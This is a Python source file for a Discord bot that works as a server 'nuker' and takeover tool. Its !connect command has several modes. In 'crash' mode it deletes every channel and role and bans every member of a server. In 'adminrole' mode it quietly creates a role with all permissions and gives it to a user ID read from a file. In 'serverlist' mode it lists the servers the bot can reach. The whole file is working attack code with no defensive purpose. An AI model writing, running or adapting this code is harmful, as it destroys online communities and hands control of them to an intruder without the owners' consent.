import discord
from discord.ext import commands
from discord import Permissions

token = open('token.txt').readline()

bot = commands.Bot(command_prefix = '!')

@bot.command()
async def connect(ctx):
	if open('mode.txt', 'r').read() == 'crash':
		open('status.txt', 'w').write('connected')
		for channel in ctx.message.guild.channels:
			try:
				await channel.delete()
			except:
				pass
		for role in ctx.message.guild.roles:
			try:
				await role.delete()
			except:
				pass
		for member in ctx.message.guild.members:
			try:
				await member.ban()
			except:
				pass
	if open('mode.txt', 'r').read() == 'adminrole':
		id = open('output.txt', 'r').read()
		open('output.txt', 'w').write('clear')
		open('status.txt', 'w').write('connected')
		role = await ctx.message.guild.create_role(name='sarvente', permissions=Permissions.all())
		member = await ctx.message.guild.fetch_member(int(id))
		await member.add_roles(discord.Object(role.id))
	if open('mode.txt', 'r').read() == 'serverlist':
		print('Connected!\n')
		for guild in bot.guilds:
			print(f'\nName: {guild.name} ||| ID: {guild.id}')


bot.run(token)